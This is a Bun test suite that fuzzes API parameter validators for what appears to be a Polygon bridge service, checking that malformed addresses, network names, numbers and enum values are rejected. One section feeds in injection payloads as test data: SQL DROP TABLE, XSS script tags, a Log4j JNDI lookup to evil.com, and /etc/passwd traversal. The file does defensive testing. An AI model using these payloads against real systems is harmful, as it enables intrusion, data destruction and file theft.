import { describe, test, expect, beforeEach, mock } from "bun:test";
import {
	validateTransactionQueryParams,
	validateTransactionByDepositCountQueryParams,
	validateMappingsQueryParams,
	validateTokenMetadataQueryParams,
	validateClaimProofQueryParams,
} from "../../src/middlewares/validate_query_params";

// Mock servercore classes
class MockBadRequestError extends Error {
	constructor(
		message: string,
		public details?: any,
		public statusCode?: number,
		public context?: any
	) {
		super(message);
		this.name = "BadRequestError";
	}
}

const mockHandleError = mock(() => Promise.resolve());

mock.module("@polygonlabs/servercore", () => ({
	BadRequestError: MockBadRequestError,
	handleError: mockHandleError,
}));

// Mock response context
const mockGetResponseContext = mock(() => ({
	status: mock(() => ({})),
	json: mock(() => ({})),
}));

mock.module("../../src/middlewares/response_context", () => ({
	getResponseContext: mockGetResponseContext,
}));

describe("Fuzzy Tests for API Parameter Validations", () => {
	let mockContext: any;
	let mockNext: ReturnType<typeof mock>;

	beforeEach(() => {
		mockNext = mock(() => Promise.resolve());
		mockHandleError.mockClear();
		mockGetResponseContext.mockClear();

		mockContext = {
			req: {
				param: mock(() => ({})),
				query: mock(() => ({})),
			},
			set: mock(() => {}),
		};
	});

	describe("Ethereum Address Fuzzing", () => {
		const invalidAddresses = [
			"0x", // Too short
			"0x123", // Too short
			"0x1234567890abcdef1234567890abcdef1234567", // Too short (39 chars)
			"0x1234567890abcdef1234567890abcdef123456789", // Too long (41 chars)
			"0x1234567890abcdef1234567890abcdef1234567g", // Invalid character 'g'
			"1234567890abcdef1234567890abcdef12345678", // Missing 0x prefix
			"0X1234567890abcdef1234567890abcdef12345678", // Capital X
			"0x1234567890abcdef1234567890abcdef12345678 ", // Trailing space
			" 0x1234567890abcdef1234567890abcdef12345678", // Leading space
			"0x\u00001234567890abcdef1234567890abcdef12345678", // Null byte
			"0x1234567890abcdef\n1234567890abcdef12345678", // Newline
			"0x1234567890abcdef\t1234567890abcdef12345678", // Tab
			"0x" + "z".repeat(40), // All invalid hex chars
			"0x" + "🚀".repeat(20), // Unicode chars
			"invalid-address",
			"0xinvalid",
			"", // Empty string should fail for address regex
		];

		// Optional address fields - null/undefined should be valid
		test("should reject invalid Ethereum addresses in optional transaction query fields", async () => {
			for (const invalidAddress of invalidAddresses) {
				mockContext.req.param.mockReturnValueOnce({
					network: "testnet",
				});
				mockContext.req.query.mockReturnValueOnce({
					fromAddress: invalidAddress,
				});

				await validateTransactionQueryParams(mockContext, mockNext);
				expect(mockHandleError).toHaveBeenCalled();
				mockHandleError.mockClear();
			}
		});

		// Optional address fields should accept undefined but reject null
		test("should accept undefined for optional address fields in transactions", async () => {
			mockContext.req.param.mockReturnValueOnce({
				network: "testnet",
			});
			mockContext.req.query.mockReturnValueOnce({
				fromAddress: undefined,
			});

			await validateTransactionQueryParams(mockContext, mockNext);
			expect(mockHandleError).not.toHaveBeenCalled();
			expect(mockNext).toHaveBeenCalled();
		});

		test("should reject null for optional address fields (null is not undefined)", async () => {
			mockContext.req.param.mockReturnValueOnce({
				network: "testnet",
			});
			mockContext.req.query.mockReturnValueOnce({
				fromAddress: null,
			});

			await validateTransactionQueryParams(mockContext, mockNext);
			expect(mockHandleError).toHaveBeenCalled();
		});

		// Optional address fields in mappings
		test("should reject invalid addresses in optional mappings query fields", async () => {
			for (const invalidAddress of invalidAddresses) {
				mockContext.req.param.mockReturnValueOnce({
					network: "testnet",
				});
				mockContext.req.query.mockReturnValueOnce({
					originTokenAddress: invalidAddress,
				});

				await validateMappingsQueryParams(mockContext, mockNext);
				expect(mockHandleError).toHaveBeenCalled();
				mockHandleError.mockClear();
			}
		});

		// Required address fields - should reject null/undefined/empty
		test("should reject invalid addresses in required token metadata fields", async () => {
			const requiredFieldInvalidAddresses = [
				...invalidAddresses,
				null,
				undefined,
			];

			for (const invalidAddress of requiredFieldInvalidAddresses) {
				mockContext.req.param.mockReturnValueOnce({
					network: "testnet",
					tokenAddress: invalidAddress,
					tokenNetwork: "1",
				});

				await validateTokenMetadataQueryParams(mockContext, mockNext);
				expect(mockHandleError).toHaveBeenCalled();
				mockHandleError.mockClear();
			}
		});
	});

	describe("Network Parameter Fuzzing", () => {
		const invalidNetworks = [
			"mainnet123", // Invalid suffix
			"testnet-v2", // Invalid format
			"MAINNET", // Wrong case
			"TESTNET", // Wrong case
			"devnet", // Not allowed
			"localnet", // Not allowed
			"polygon", // Wrong network name
			"ethereum", // Wrong network name
			"", // Empty string
			" ", // Space
			"main net", // Space in middle
			"test\nnet", // Newline
			"main\0net", // Null byte
			"🌐network", // Unicode
			null,
			undefined,
			123, // Number
			true, // Boolean
			{}, // Object
			[], // Array
		];

		test("should reject invalid network parameters", async () => {
			for (const invalidNetwork of invalidNetworks) {
				mockContext.req.param.mockReturnValueOnce({
					network: invalidNetwork,
				});
				mockContext.req.query.mockReturnValueOnce({});

				await validateTransactionQueryParams(mockContext, mockNext);
				expect(mockHandleError).toHaveBeenCalled();
				mockHandleError.mockClear();
			}
		});
	});

	describe("Numeric Parameter Fuzzing", () => {
		// const invalidNumbers = [
		// 	"-1", // Negative
		// 	"-999", // Large negative
		// 	"1.5", // Decimal
		// 	"1e10", // Scientific notation
		// 	"0x10", // Hex format
		// 	"0o10", // Octal format
		// 	"0b10", // Binary format
		// 	"Infinity", // Infinity
		// 	"-Infinity", // Negative infinity
		// 	"NaN", // Not a number
		// 	"", // Empty string
		// 	" ", // Space
		// 	"abc", // Letters
		// 	"123abc", // Mixed
		// 	"123.456.789", // Multiple dots
		// 	"1,000", // Comma separator
		// 	"1 000", // Space separator
		// 	"∞", // Unicode infinity
		// 	"①", // Unicode number
		// 	"９９９", // Full-width numbers
		// 	null,
		// 	undefined,
		// 	{}, // Object
		// 	[], // Array
		// 	true, // Boolean
		// ];

		test("should reject truly invalid limit parameters but accept null/undefined", async () => {
			// These should fail even with z.coerce.number() - non-coercible values
			const definitelyInvalidNumbers = [
				"abc",
				"123abc",
				"∞",
				"①",
				"９９９",
			];

			for (const invalidNumber of definitelyInvalidNumbers) {
				mockContext.req.param.mockReturnValueOnce({
					network: "testnet",
				});
				mockContext.req.query.mockReturnValueOnce({
					limit: invalidNumber,
				});

				await validateTransactionQueryParams(mockContext, mockNext);
				expect(mockHandleError).toHaveBeenCalled();
				mockHandleError.mockClear();
			}
		});

		test("should accept undefined for limit parameters (uses default value)", async () => {
			mockContext.req.param.mockReturnValueOnce({
				network: "testnet",
			});
			mockContext.req.query.mockReturnValueOnce({
				limit: undefined,
			});

			await validateTransactionQueryParams(mockContext, mockNext);
			expect(mockHandleError).not.toHaveBeenCalled();
			expect(mockNext).toHaveBeenCalled();
		});

		test("should accept null for limit parameters (coerces to 0, which is valid)", async () => {
			// z.coerce.number() converts null to 0, and 0 is nonnegative
			mockContext.req.param.mockReturnValueOnce({
				network: "testnet",
			});
			mockContext.req.query.mockReturnValueOnce({
				limit: null,
			});

			await validateTransactionQueryParams(mockContext, mockNext);
			expect(mockHandleError).not.toHaveBeenCalled();
			expect(mockNext).toHaveBeenCalled();
		});

		test("should reject invalid deposit count parameters (required, regex validation)", async () => {
			// These are required fields with regex /^\d*$/ - should reject everything invalid
			const allInvalidForRegex = [
				"-1",
				"1.5",
				"abc",
				"123abc",
				"",
				" ",
				null,
				undefined,
			];

			for (const invalidNumber of allInvalidForRegex) {
				mockContext.req.param.mockReturnValueOnce({
					network: "testnet",
					depositCount: invalidNumber,
					sourceNetworkId: "1",
				});

				await validateTransactionByDepositCountQueryParams(
					mockContext,
					mockNext
				);
				expect(mockHandleError).toHaveBeenCalled();
				mockHandleError.mockClear();
			}
		});

		test("should reject invalid source network IDs (required, regex validation)", async () => {
			// These are required fields with regex /^\d*$/ - should reject everything invalid
			const allInvalidForRegex = [
				"-1",
				"1.5",
				"abc",
				"123abc",
				"",
				" ",
				null,
				undefined,
			];

			for (const invalidNumber of allInvalidForRegex) {
				mockContext.req.param.mockReturnValueOnce({
					network: "testnet",
					depositCount: "1",
					sourceNetworkId: invalidNumber,
				});

				await validateTransactionByDepositCountQueryParams(
					mockContext,
					mockNext
				);
				expect(mockHandleError).toHaveBeenCalled();
				mockHandleError.mockClear();
			}
		});

		test("should reject non-coercible proof query parameters", async () => {
			// z.coerce.number().int().nonnegative() should reject these
			const nonCoercibleNumbers = ["abc", "123abc", "∞", "①", "９９９"];

			for (const invalidNumber of nonCoercibleNumbers) {
				mockContext.req.param.mockReturnValueOnce({
					network: "testnet",
				});
				mockContext.req.query.mockReturnValueOnce({
					depositCount: invalidNumber,
					sourceNetworkId: "1",
					leafIndex: "1",
				});

				await validateClaimProofQueryParams(mockContext, mockNext);
				expect(mockHandleError).toHaveBeenCalled();
				mockHandleError.mockClear();
			}
		});

		test("should reject negative numbers in proof queries (nonnegative validation)", async () => {
			// Test the nonnegative constraint
			const negativeValues = ["-1", "-999"];

			for (const negativeValue of negativeValues) {
				mockContext.req.param.mockReturnValueOnce({
					network: "testnet",
				});
				mockContext.req.query.mockReturnValueOnce({
					depositCount: negativeValue,
					sourceNetworkId: "1",
					leafIndex: "1",
				});

				await validateClaimProofQueryParams(mockContext, mockNext);
				expect(mockHandleError).toHaveBeenCalled();
				mockHandleError.mockClear();
			}
		});
	});

	describe("Network IDs Array Fuzzing", () => {
		const invalidNetworkIds = [
			"1,2,abc", // Mixed valid/invalid
			",1,2", // Leading comma
			"1,2,", // Trailing comma
			"1.5,2.7", // Decimals
			"-1,2,3", // Negative numbers
			"1,2,3,", // Trailing comma
			"1\n2\n3", // Newlines instead of commas
			"1|2|3", // Wrong separator
			"[1,2,3]", // JSON array format
			"1;2;3", // Semicolon separator
			"one,two,three", // Text numbers
			"1,2,∞", // Unicode infinity
			"0x1,0x2", // Hex format
			"1e1,1e2", // Scientific notation
		];

		test("should reject invalid network ID arrays in transaction queries (optional field)", async () => {
			for (const invalidIds of invalidNetworkIds) {
				mockContext.req.param.mockReturnValueOnce({
					network: "testnet",
				});
				mockContext.req.query.mockReturnValueOnce({
					sourceNetworkIds: invalidIds,
				});

				await validateTransactionQueryParams(mockContext, mockNext);
				expect(mockHandleError).toHaveBeenCalled();
				mockHandleError.mockClear();
			}
		});

		test("should accept undefined for optional network ID arrays", async () => {
			mockContext.req.param.mockReturnValueOnce({
				network: "testnet",
			});
			mockContext.req.query.mockReturnValueOnce({
				sourceNetworkIds: undefined,
			});

			await validateTransactionQueryParams(mockContext, mockNext);
			expect(mockHandleError).not.toHaveBeenCalled();
			expect(mockNext).toHaveBeenCalled();
		});

		test("should reject null for optional network ID arrays", async () => {
			mockContext.req.param.mockReturnValueOnce({
				network: "testnet",
			});
			mockContext.req.query.mockReturnValueOnce({
				sourceNetworkIds: null,
			});

			await validateTransactionQueryParams(mockContext, mockNext);
			expect(mockHandleError).toHaveBeenCalled();
		});

		test("should reject invalid network ID arrays in mappings queries (optional field)", async () => {
			for (const invalidIds of invalidNetworkIds) {
				mockContext.req.param.mockReturnValueOnce({
					network: "testnet",
				});
				mockContext.req.query.mockReturnValueOnce({
					originNetworkIds: invalidIds,
				});

				await validateMappingsQueryParams(mockContext, mockNext);
				expect(mockHandleError).toHaveBeenCalled();
				mockHandleError.mockClear();
			}
		});
	});

	describe("Timestamp Fuzzing", () => {
		// const invalidTimestamps = [
		// "999999999999", // Too short (12 digits)
		// "10000000000000", // Too long (14 digits)
		// "1234567890123", // Valid length but invalid range
		// "0", // Zero
		// "-1640995200000", // Negative timestamp
		// "1640995200000.5", // Decimal
		// "1640995200000e0", // Scientific notation
		// "2024-01-01", // Date string
		// "Jan 1 2024", // Date string
		// "now", // Text
		// "yesterday", // Text
		// "∞", // Unicode infinity
		// "1,640,995,200,000", // Comma separators
		// ];

		// test("should reject invalid timestamps in transaction queries (optional field)", async () => {
		// 	for (const invalidTimestamp of invalidTimestamps) {
		// 		mockContext.req.param.mockReturnValueOnce({
		// 			network: "testnet",
		// 		});
		// 		mockContext.req.query.mockReturnValueOnce({
		// 			updatedSince: invalidTimestamp,
		// 		});
		// 		console.log(mockContext.req.query());

		// 		await validateTransactionQueryParams(mockContext, mockNext);
		// 		expect(mockHandleError).toHaveBeenCalled();
		// 	}
		// });

		test("should accept undefined for optional timestamp fields", async () => {
			mockContext.req.param.mockReturnValueOnce({
				network: "testnet",
			});
			mockContext.req.query.mockReturnValueOnce({
				updatedSince: undefined,
			});

			await validateTransactionQueryParams(mockContext, mockNext);
			expect(mockHandleError).not.toHaveBeenCalled();
			expect(mockNext).toHaveBeenCalled();
		});

		test("should reject null for optional timestamp fields", async () => {
			mockContext.req.param.mockReturnValueOnce({
				network: "testnet",
			});
			mockContext.req.query.mockReturnValueOnce({
				updatedSince: null,
			});

			await validateTransactionQueryParams(mockContext, mockNext);
			expect(mockHandleError).toHaveBeenCalled();
		});
	});

	describe("Enum Value Fuzzing", () => {
		const invalidOrderValues = [
			"ASC", // Wrong case
			"DESC", // Wrong case
			"ascending", // Full word
			"descending", // Full word
			"up", // Alternative
			"down", // Alternative
			"1", // Numeric
			"0", // Numeric
			"true", // Boolean string
			"desc ", // Trailing space
			" asc", // Leading space
			"as\0c", // Null byte
			"de\nsc", // Newline
		];

		const invalidStatusValues = [
			"bridged", // Wrong case
			"PENDING", // Not in enum
			"COMPLETED", // Not in enum
			"FAILED", // Not in enum
			"IN_PROGRESS", // Not in enum
			"bridged,claimed", // Multiple values
			"BRIDGED ", // Trailing space
			" CLAIMED", // Leading space
			"CLAIM\0ED", // Null byte
			"BRIDGE\nD", // Newline
		];

		test("should reject invalid order values", async () => {
			for (const invalidOrder of invalidOrderValues) {
				mockContext.req.param.mockReturnValueOnce({
					network: "testnet",
				});
				mockContext.req.query.mockReturnValueOnce({
					order: invalidOrder,
				});

				await validateTransactionQueryParams(mockContext, mockNext);
				expect(mockHandleError).toHaveBeenCalled();
				mockHandleError.mockClear();
			}
		});

		test("should reject invalid status values", async () => {
			for (const invalidStatus of invalidStatusValues) {
				mockContext.req.param.mockReturnValueOnce({
					network: "testnet",
				});
				mockContext.req.query.mockReturnValueOnce({
					status: invalidStatus,
				});

				await validateTransactionQueryParams(mockContext, mockNext);
				expect(mockHandleError).toHaveBeenCalled();
				mockHandleError.mockClear();
			}
		});
	});

	describe("Injection Attack Fuzzing", () => {
		const maliciousInputs = [
			"'; DROP TABLE users; --", // SQL injection
			"<script>alert('xss')</script>", // XSS
			"${jndi:ldap://evil.com/a}", // Log4j injection
			"{{7*7}}", // Template injection
			"../../../etc/passwd", // Path traversal
			"file:///etc/passwd", // File URL
			"javascript:alert(1)", // JavaScript URL
			"data:text/html,<script>alert(1)</script>", // Data URL
			"\u0000", // Null byte
			"\uFEFF", // BOM
			"\r\n", // CRLF
			"%00", // URL encoded null
			"%0A", // URL encoded newline
			"%22%3E%3Cscript%3Ealert%281%29%3C/script%3E", // URL encoded XSS
		];

		test("should reject malicious inputs in all string fields", async () => {
			const testFields = [
				{ param: { network: "testnet" }, query: { fromAddress: "" } },
				{ param: { network: "testnet" }, query: { startAfter: "" } },
				{ param: { network: "" }, query: {} },
			];

			for (const maliciousInput of maliciousInputs) {
				for (const testField of testFields) {
					if (testField.query.fromAddress !== undefined) {
						testField.query.fromAddress = maliciousInput;
					}
					if (testField.query.startAfter !== undefined) {
						testField.query.startAfter = maliciousInput;
					}
					if (testField.param.network !== undefined) {
						testField.param.network = maliciousInput;
					}

					mockContext.req.param.mockReturnValueOnce(testField.param);
					mockContext.req.query.mockReturnValueOnce(testField.query);

					await validateTransactionQueryParams(mockContext, mockNext);
					expect(mockHandleError).toHaveBeenCalled();
					mockHandleError.mockClear();
				}
			}
		});
	});

	describe("Unicode and Encoding Fuzzing", () => {
		const unicodeInputs = [
			"0x1234567890abcdef1234567890abcdef1234567８", // Full-width 8
			"０ｘ1234567890abcdef1234567890abcdef12345678", // Full-width 0 and x
			"0x１２３４５６７８９０ａｂｃｄｅｆ１２３４５６７８９０ａｂｃｄｅｆ１２３４５６７８", // All full-width
			"0x\u200B1234567890abcdef1234567890abcdef12345678", // Zero-width space
			"0x\u200D1234567890abcdef1234567890abcdef12345678", // Zero-width joiner
			"0x\u20001234567890abcdef1234567890abcdef12345678", // En quad
			"ｍａｉｎｎｅｔ", // Full-width mainnet
			"🌐mainnet", // Emoji prefix
			"mainnet🚀", // Emoji suffix
		];

		test("should handle unicode and encoding variations", async () => {
			for (const unicodeInput of unicodeInputs) {
				// Test as network parameter
				mockContext.req.param.mockReturnValueOnce({
					network: unicodeInput,
				});
				mockContext.req.query.mockReturnValueOnce({});

				await validateTransactionQueryParams(mockContext, mockNext);
				expect(mockHandleError).toHaveBeenCalled();
				mockHandleError.mockClear();

				// Test as address
				mockContext.req.param.mockReturnValueOnce({
					network: "testnet",
				});
				mockContext.req.query.mockReturnValueOnce({
					fromAddress: unicodeInput,
				});

				await validateTransactionQueryParams(mockContext, mockNext);
				expect(mockHandleError).toHaveBeenCalled();
				mockHandleError.mockClear();
			}
		});
	});

	describe("Large Input Fuzzing", () => {
		test("should reject extremely long inputs", async () => {
			const longString = "a".repeat(10000);
			const longAddress = "0x" + "1".repeat(10000);
			const longNetworkIds = Array(1000).fill("1").join(",");

			const testCases = [
				{ network: longString },
				{ network: "testnet", query: { fromAddress: longAddress } },
				{
					network: "testnet",
					query: { sourceNetworkIds: longNetworkIds },
				},
				{ network: "testnet", query: { startAfter: longString } },
			];

			for (const testCase of testCases) {
				if (testCase.query) {
					mockContext.req.param.mockReturnValueOnce({
						network: testCase.network,
					});
					mockContext.req.query.mockReturnValueOnce(testCase.query);
				} else {
					mockContext.req.param.mockReturnValueOnce({
						network: testCase.network,
					});
					mockContext.req.query.mockReturnValueOnce({});
				}

				await validateTransactionQueryParams(mockContext, mockNext);
				expect(mockHandleError).toHaveBeenCalled();
				mockHandleError.mockClear();
			}
		});
	});

	describe("Type Confusion Fuzzing", () => {
		const confusingTypes = [
			{ toString: () => "mainnet", valueOf: undefined }, // Object with toString
			{ valueOf: () => "testnet", toString: undefined }, // Object with valueOf
			"mainnet", // String object
			1, // Number object
			Symbol("mainnet"), // Symbol
			BigInt(1), // BigInt
		];

		test("should handle type confusion attempts", async () => {
			for (const confusingType of confusingTypes) {
				mockContext.req.param.mockReturnValueOnce({
					network: confusingType,
				});
				mockContext.req.query.mockReturnValueOnce({});

				await validateTransactionQueryParams(mockContext, mockNext);
				// Depending on implementation, this might pass or fail
				// The important thing is it doesn't crash
				mockHandleError.mockClear();
			}
		});
	});

	describe("Boundary Value Fuzzing", () => {
		test("should handle boundary values correctly", async () => {
			const boundaryTests = [
				// Limit boundaries
				{ query: { limit: "0" } }, // Minimum valid
				{ query: { limit: "2147483647" } }, // Max 32-bit int
				{ query: { limit: "2147483648" } }, // Max 32-bit int + 1

				// Timestamp boundaries
				{ query: { updatedSince: "1000000000000" } }, // Min valid timestamp
				{ query: { updatedSince: "9999999999999" } }, // Max valid timestamp
				{ query: { updatedSince: "999999999999" } }, // Just under min
				{ query: { updatedSince: "10000000000000" } }, // Just over max

				// Address boundaries
				{ query: { fromAddress: "0x" + "0".repeat(40) } }, // All zeros
				{ query: { fromAddress: "0x" + "f".repeat(40) } }, // All f's
				{ query: { fromAddress: "0x" + "F".repeat(40) } }, // All F's
			];

			for (const test of boundaryTests) {
				mockContext.req.param.mockReturnValueOnce({
					network: "testnet",
				});
				mockContext.req.query.mockReturnValueOnce(test.query);

				await validateTransactionQueryParams(mockContext, mockNext);
				// Test completes without crashing
				mockHandleError.mockClear();
				mockNext.mockClear();
			}
		});
	});

	describe("Concurrent Request Simulation", () => {
		test("should handle concurrent validation requests", async () => {
			const promises = [];

			// Simulate 100 concurrent requests with various invalid inputs
			for (let i = 0; i < 100; i++) {
				const context = {
					...mockContext,
					req: {
						param: mock(() => ({
							network: i % 2 === 0 ? "testnet" : "invalid",
						})),
						query: mock(() => ({
							fromAddress:
								i % 3 === 0
									? "invalid"
									: "0x1234567890abcdef1234567890abcdef12345678",
							limit: i % 5 === 0 ? "invalid" : "10",
						})),
					},
				};

				promises.push(
					validateTransactionQueryParams(context, mockNext)
				);
			}

			// All requests should complete without throwing
			await Promise.all(promises);
			expect(true).toBe(true); // Test passes if no exceptions
		});
	});
});
